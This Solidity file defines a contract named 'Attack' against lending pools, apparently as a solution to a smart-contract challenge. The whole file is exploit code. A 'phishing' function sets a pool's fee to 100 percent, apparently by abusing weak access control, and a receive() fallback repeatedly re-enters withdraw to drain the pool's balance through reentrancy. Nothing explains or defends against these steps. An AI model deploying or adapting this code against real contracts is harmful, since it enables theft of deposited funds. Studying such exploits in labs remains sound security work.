// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "hardhat/console.sol";

interface Pool {
    function setFeePercent(uint256 _percent) external;

    function deposit() external payable;

    function withdraw(uint256 _amountOfPositions) external;

    function getFee(uint256 _borrowAmount) external pure returns (uint256);

    function flashLoan(address borrowingContract, uint256 amount) external;
}

contract Attack {
    Pool[2] public pools;

    constructor(Pool[2] memory _pools) {
        pools = _pools;
    }

    function phishing(uint256 _type) external payable {
        pools[_type].setFeePercent(100);
    }

    receive() external payable {
        Pool _pool;
        msg.sender == address(pools[0]) ? _pool = pools[0] : _pool = pools[1];
        if (address(_pool).balance != 0) {
            _pool.withdraw(1);
        }
    }
}
